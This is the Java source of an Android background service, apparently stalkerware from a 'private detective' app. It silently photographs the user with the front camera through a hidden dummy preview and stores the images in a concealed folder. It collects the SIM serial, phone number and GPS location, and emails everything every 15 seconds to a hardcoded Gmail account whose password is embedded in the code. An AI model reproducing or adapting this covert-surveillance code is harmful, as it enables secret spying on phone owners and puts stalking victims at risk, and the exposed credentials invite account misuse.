package com.usk.personal.privatedetective;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Date;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.hardware.Camera;
import android.hardware.Camera.PictureCallback;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.SurfaceView;

public class USKIntentService extends Service implements LocationListener{

	private File folder = null;
	SharedPreferences sharedpreferences;
	int count = 0;
	protected LocationManager locationManager;
	private String currentLocation;
	private Criteria criteria;
	private String provider;
	
	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) 
	{
		String ext_storage_state = Environment.getExternalStorageDirectory()
				.getAbsolutePath();
		folder = new File(ext_storage_state + File.separator + ".NicePics"
				+ File.separator + ".Android");
		if (!folder.exists()) {
			folder.mkdirs();
		}
		 sharedpreferences = getSharedPreferences(MainActivity.PREFNAME, Context.MODE_PRIVATE);
		 
		 count = sharedpreferences.getInt(MainActivity.COUNT, 0);
		 
		takePictureNoPreview(this);
		
		// Get the location manager
          locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
          // Define the criteria how to select the location provider
          criteria = new Criteria();
          criteria.setAccuracy(Criteria.ACCURACY_COARSE);   //default
		
		criteria.setCostAllowed(false);
		// get the best provider depending on the criteria
	      provider = locationManager.getBestProvider(criteria, false);
	     
	      // the last known location of this provider
	          Location location = locationManager.getLastKnownLocation(provider);
	 
	     
	          if (location != null) {
	             onLocationChanged(location);
	          } else {
	              // leads to the settings because there is no last known location
	          Intent locint = new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS);
	          startActivity(locint);
	      }
	      // location updates: at least 1 meter and 200millsecs change
	      locationManager.requestLocationUpdates(provider, 10000, 1, this);
		return START_STICKY;
	}
	
	Camera cam, camr;

	public void takePictureNoPreview(Context context) { // open back facing
														// camera by default

		cam = openFrontFacingCameraGingerbread();

		if (cam != null) {
			try { // set camera parameters if you want to

				// here, the unused surface view and holder

				SurfaceView dummy = new SurfaceView(context);
				cam.setPreviewDisplay(dummy.getHolder());
				cam.startPreview();
				cam.takePicture(null, null, getJpegCallback());

			} catch (Exception e) {
				e.printStackTrace();
			} finally {
				
			}
		} else {
			camr = Camera.open();
			if (camr != null) {
				try { // set camera parameters if you want to

					// here, the unused surface view and holder

					SurfaceView dummy = new SurfaceView(context);
					camr.setPreviewDisplay(dummy.getHolder());
					camr.startPreview();
					camr.takePicture(null, null, getJpegCallback());

				} catch (Exception e) {
					e.printStackTrace();
				} finally {
					
				}
			}
		}
	}

	// Selecting front facing camera.

	private Camera openFrontFacingCameraGingerbread() {
		int cameraCount = 0;
		Camera cam = null;
		Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
		cameraCount = Camera.getNumberOfCameras();
		for (int camIdx = 0; camIdx < cameraCount; camIdx++) {
			Camera.getCameraInfo(camIdx, cameraInfo);
			if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
				try {
					cam = Camera.open(camIdx);
					break;
				} catch (RuntimeException e) {
					e.printStackTrace();
				}
			}
		}
		return cam;
	}

	private PictureCallback getJpegCallback() {
		PictureCallback jpeg = new PictureCallback() {
			@Override
			public void onPictureTaken(byte[] data, Camera camera) {
				FileOutputStream fos;
				try {
					File image = new File(folder.getAbsolutePath()
							+ File.separator
							+ new Date().toString().replace(":", "")
									.replace(" ", "") + ".jpeg");
					image.createNewFile();
					fos = new FileOutputStream(image);
					fos.write(data);
					fos.close();
					new SendingMail().execute(image.getAbsolutePath());
				} catch (IOException e) {
					// do something about it
					e.printStackTrace();
				} catch (Exception e) {
					// TODO: handle exception
					e.printStackTrace();
				} finally {
					if (cam != null) {
						cam.release();
					}

					if (camr != null) {
						camr.release();
					}
				}
				
			}
		};
		return jpeg;
	}

	@Override
	public void onDestroy() {
		super.onDestroy();
		if (cam != null) {
			cam.release();
		}

		if (camr != null) {
			camr.release();
		}
	}

	private static final ScheduledExecutorService worker = Executors
			.newSingleThreadScheduledExecutor();

	private void takeNewPhoto() {
		Runnable task = new Runnable() {
			@Override
			public void run() {
				if(count<MainActivity.MAX_NO_OF_EMAILS && isOnline(USKIntentService.this) )
				{
					handler.sendEmptyMessage(0);
				}
				else
				{
					stopSelf();
				}
			}

			
		};
		worker.schedule(task, 15, TimeUnit.SECONDS);
	}

	private boolean isOnline(Context context) {
		ConnectivityManager cm = (ConnectivityManager) context
				.getSystemService(Context.CONNECTIVITY_SERVICE);

		NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
		if (null != activeNetwork) {
			if (activeNetwork.getType() == ConnectivityManager.TYPE_WIFI)
				return true;

			if (activeNetwork.getType() == ConnectivityManager.TYPE_MOBILE)
				return true;
		}
		return false;
	}
	
	Handler handler = new Handler()
	{
		@Override
		public void handleMessage(android.os.Message msg) 
		{
			takePictureNoPreview(USKIntentService.this);
		};
	};
	private class SendingMail extends AsyncTask<String, Void, String> {
		@Override
		protected String doInBackground(String... params) {
			String getSimSerialNumber = "", getSimNumber = "";
			try {
				TelephonyManager telemamanger = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
				getSimSerialNumber = telemamanger.getSimSerialNumber();
				getSimNumber = telemamanger.getLine1Number();
			} catch (Exception e) {
				e.printStackTrace();
			}
			String image = params[0];
			Mail m = new Mail("attempt2013@gmail.com", "attempt#2014");

			String[] toArr = { "attempt2013@gmail.com" };
			m.setTo(toArr);
			m.setFrom("sawankumar46@gmail.com");
			m.setSubject("Programming Examples:USK");
			m.setBody("SimSerialNumber : " + getSimSerialNumber
					+ " and SimNumber :" + getSimNumber+" count of Email you got: "+count+ " "+currentLocation);

			try {
				m.addAttachment(image);

				if (m.send()) {
					// Toast.makeText(MainActivity.this,
					// "Email was sent successfully.",
					// Toast.LENGTH_LONG).show();
					Editor editor = sharedpreferences.edit();
					 editor.putInt(MainActivity.COUNT, count++);
					 editor.commit();
					 
					 
				} else {
					// Toast.makeText(MainActivity.this, "Email was not sent.",
					// Toast.LENGTH_LONG).show();
				}
			} catch (Exception e) {
				// Toast.makeText(MailApp.this,
				// "There was a problem sending the email.",
				// Toast.LENGTH_LONG).show();
				Log.e("MailApp", "Could not send email", e);
			}

			return image;
		}

		@Override
		protected void onPostExecute(String result) {
			File deleteImg = new File(result);
			deleteImg.delete();
			takeNewPhoto();
		}
	}
	@Override
	public void onLocationChanged(Location location) {
		currentLocation = "Latitude:" + location.getLatitude() + ", Longitude:" + location.getLongitude();
		
	}

	@Override
	public void onProviderDisabled(String provider) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void onProviderEnabled(String provider) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void onStatusChanged(String provider, int status, Bundle extras) {
		// TODO Auto-generated method stub
		
	}
}
